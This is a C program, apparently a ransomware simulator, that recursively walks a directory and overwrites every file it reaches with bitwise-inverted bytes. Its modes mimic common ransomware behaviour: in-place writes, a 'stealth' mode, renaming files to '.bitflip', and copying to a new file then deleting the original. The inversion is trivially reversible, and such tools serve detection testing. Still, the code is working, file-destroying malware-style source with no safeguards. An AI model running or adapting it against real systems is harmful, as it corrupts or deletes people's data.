#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ftw.h>
#include <signal.h>

int BUFFER_SIZE=2097152;
int MAX_FILEHANDLES=64;
int MAX_FILENAME_LENGTH=1024;

//Global mode switch
typedef enum {
  NO_MODE,
  STEALTH_MODE,
  SEEK_MODE,
  RENAME_MODE,
  TRANSFER_MODE
} crypt_mode_t;
crypt_mode_t mode = NO_MODE;

//Set up a global interrupt boolean so that we can quit at the next complete file
bool signal_interrupt = false;
void sig_handler(int signo) {
  if (signo == SIGINT)
    fprintf(stderr, "Exiting...\n");
    signal_interrupt = true;
}

//Debug printer for char arrays
void hexprint_array(char a[], int len) {
  for ( int i = 0; i < len; i++) { printf("%02hhX", a[i]); }
  printf("\n");
}

//Where the 'encryption' happens.
void encrypt_buffer(char buffer[], int buflen) {
  for ( int i = 0 ; i < buflen ; i++) {
    buffer[i] = ~buffer[i];
  }
}

//Execute an encryption action on a single file, varying by mode.
int encrypt_file(char *filename) {
  FILE* fp_r;
  FILE* fp_w;
  int num_r;
  int num_w;
  bool eof = false;
  char buf[BUFFER_SIZE];
  fprintf(stderr, "Working on: %s\n", filename);
  char newfilename[MAX_FILENAME_LENGTH+1+8];
  strncpy(newfilename, filename, MAX_FILENAME_LENGTH);
  strcat(newfilename, ".bitflip");
  fprintf(stderr, "New name: %s\n", newfilename);
  switch (mode) {
    case SEEK_MODE:
      fprintf(stderr, "Seek mode detected ...\n");
      fp_w = fopen(filename, "rb+");
      if (fp_w == NULL) return EXIT_FAILURE;
      while (!eof) {
        num_r = fread(buf, 1, sizeof(buf), fp_w);
        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
        fseek(fp_w, -num_r, SEEK_CUR);
        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
        num_w = fwrite(buf, 1, num_r, fp_w);
        if (num_r != num_w ) {
          fprintf(stderr, "Mismatched read and write!\n");
        }
      }
      fclose(fp_w);
    break;
    case STEALTH_MODE:
      fprintf(stderr, "Stealth mode detected ...\n");
      fp_r = fopen(filename, "rb");
      if (fp_r == NULL) return EXIT_FAILURE;
      fp_w = fopen(filename, "rb+");
      if (fp_w == NULL) return EXIT_FAILURE;
      while (!eof) {
        num_r = fread(buf, 1, sizeof(buf), fp_r);
        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
        num_w = fwrite(buf, 1, num_r, fp_w);
      }
      fclose(fp_r);
      fclose(fp_w);
    break;
    case RENAME_MODE:
      fprintf(stderr, "Rename mode detected ...\n");
      fp_w = fopen(filename, "rb+");
      if (fp_w == NULL) return EXIT_FAILURE;
      while (!eof) {
        num_r = fread(buf, 1, sizeof(buf), fp_w);
        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
        fseek(fp_w, -num_r, SEEK_CUR);
        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
        num_w = fwrite(buf, 1, num_r, fp_w);
        if (num_r != num_w ) {
          fprintf(stderr, "Mismatched read and write!\n");
        }
      }
      fclose(fp_w);
      rename(filename, newfilename);
    break;
    case TRANSFER_MODE:
      fprintf(stderr, "Transfer mode detected ...\n");
      fp_r = fopen(filename, "rb");
      if (fp_r == NULL) return EXIT_FAILURE;
      fp_w = fopen(newfilename, "wb");
      if (fp_w == NULL) return EXIT_FAILURE;
      while (!eof) {
        num_r = fread(buf, 1, sizeof(buf), fp_r);
        encrypt_buffer(buf, sizeof(buf)/sizeof(buf[0]));
        if (num_r < sizeof(buf)/sizeof(buf[0])) { eof = true; }
        num_w = fwrite(buf, 1, num_r, fp_w);
      }
      fclose(fp_r);
      fclose(fp_w);
      remove(filename);
    break;
  }

  return EXIT_SUCCESS;
}

//Callback for ftw library per detected file
static int file_cb(const char *fpath, const struct stat *sb,
                    int tflag, struct FTW *ftwbuf) {
  switch (tflag) {
  case FTW_F:
    fprintf(stderr, "Encrypting: %s\n", fpath);
    encrypt_file(fpath);
    break;
  }
  if (signal_interrupt) {
    fprintf(stderr, "Exiting after file completion.");
    exit(EXIT_FAILURE);
  }
  return EXIT_SUCCESS;
}

//Traverse a specified directory, preventing interruptions except between files.
int encrypt_dir(char *dir) {
  ftw(dir, file_cb, MAX_FILEHANDLES);
  return EXIT_SUCCESS;
}

//Handle exiting with help nicely after every check
void help_exit(char *name) {
  fprintf(stderr, "Usage: %s [-rstk] [directory]\n", name);
  exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
  int opt;
  if (signal(SIGINT, sig_handler) == SIG_ERR) {
    fprintf(stderr, "Error setting up SIGINT handler.\n");
    exit(EXIT_FAILURE);
  }

  while ((opt = getopt(argc, argv, "skrth")) != -1) {
    switch (opt) {
    case 's': mode = STEALTH_MODE; break;
    case 'k': mode = SEEK_MODE; break;
    case 'r': mode = RENAME_MODE; break;
    case 't': mode = TRANSFER_MODE; break;
    case 'h': help_exit(argv[0]);
    }
  }
  if ( mode == NO_MODE) help_exit(argv[0]);
  if ( optind == argc) help_exit(argv[0]);
  return encrypt_dir(argv[optind]);
}
